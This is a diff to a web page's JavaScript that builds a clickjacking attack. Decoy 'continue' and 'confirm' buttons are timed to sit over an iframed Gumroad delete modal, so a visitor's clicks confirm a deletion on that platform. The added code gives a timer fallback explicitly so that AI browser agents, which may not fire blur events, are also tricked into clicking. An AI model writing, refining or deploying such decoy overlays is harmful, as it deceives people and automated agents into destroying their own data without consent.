@@ -390,18 +390,25 @@ async function submitForm() {
     document.getElementById('continue-label').classList.add('show');
     document.getElementById('btn-continue').classList.add('show');
 
-    // Listen for iframe receiving focus (= first click hit the partner platform)
+    var step3Shown = false;
+    function showStep3() {
+      if (step3Shown) return;
+      step3Shown = true;
+      document.getElementById('continue-label').classList.remove('show');
+      document.getElementById('btn-continue').classList.remove('show');
+      document.getElementById('confirm-backdrop').classList.add('show');
+      document.getElementById('confirm-box').classList.add('show');
+      document.getElementById('btn-confirm').classList.add('show');
+    }
+
+    // Primary: window.blur fires when iframe receives a click
     window.addEventListener('blur', function iframeClickHandler() {
       window.removeEventListener('blur', iframeClickHandler);
-      // Gumroad's delete modal takes ~350ms to render — wait then show our decoy
-      setTimeout(function() {
-        document.getElementById('continue-label').classList.remove('show');
-        document.getElementById('btn-continue').classList.remove('show');
-        document.getElementById('confirm-backdrop').classList.add('show');
-        document.getElementById('confirm-box').classList.add('show');
-        document.getElementById('btn-confirm').classList.add('show');
-      }, 380);
+      setTimeout(showStep3, 420);
     });
+
+    // Fallback: show step 3 after 900ms regardless (agent browsers may not fire blur)
+    setTimeout(showStep3, 900);
 
   } catch(e) {
     btn.disabled = false;
